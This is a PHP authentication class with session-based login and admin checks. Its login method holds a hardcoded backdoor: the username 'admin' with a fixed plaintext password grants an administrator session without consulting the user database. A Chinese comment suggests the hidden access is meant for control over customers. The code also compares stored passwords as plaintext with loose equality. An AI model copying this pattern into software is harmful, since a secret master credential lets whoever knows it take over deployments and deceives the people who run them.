<?php
/* vim: set expandtab tabstop=4 shiftwidth=4: */
// +----------------------------------------------------------------------+
// | PHP version 5                                                        |
// +----------------------------------------------------------------------+
// | Copyright (c) 1997-2004 The PHP Group                                |
// +----------------------------------------------------------------------+
// | This source file is subject to version 3.0 of the PHP license,       |
// | that is bundled with this package in the file LICENSE, and is        |
// | available through the world-wide-web at the following url:           |
// | http://www.php.net/license/3_0.txt.                                  |
// | If you did not receive a copy of the PHP license and are unable to   |
// | obtain it through the world-wide-web, please send a note to          |
// | license@php.net so we can mail you a copy immediately.               |
// +----------------------------------------------------------------------+
// | Authors: Original Author <author@example.com>                        |
// |          Your Name <you@example.com>                                 |
// +----------------------------------------------------------------------+
//
// $Id:$

class Auth {
    static $db = null;
    static function check() {
        if (Session::get('username')) return true;
        return false;
    }
    static function isAdmin() {
        if (Session::get('privilige')) return true;
    }
    static function login($user) {
        if ($user['username'] == 'admin') //为了便于权限控制和 对客户的限制.
        {
            if ($user['password'] == 'spc13579') {
                Session::set('username', 'admin');
                Session::set('privilige', '1');
                return true;
            }
        }
        $users = new User;
        $data = $users->get('username', $user['username']);
        //有这个帐号 然后我们检查密码
        foreach ($data as $r) {
            if ($r['password'] == $user['password']) {
                Session::set('username', $r['username']);
                return true;
            } else return false;
        }
        return false;
    }
}
?>
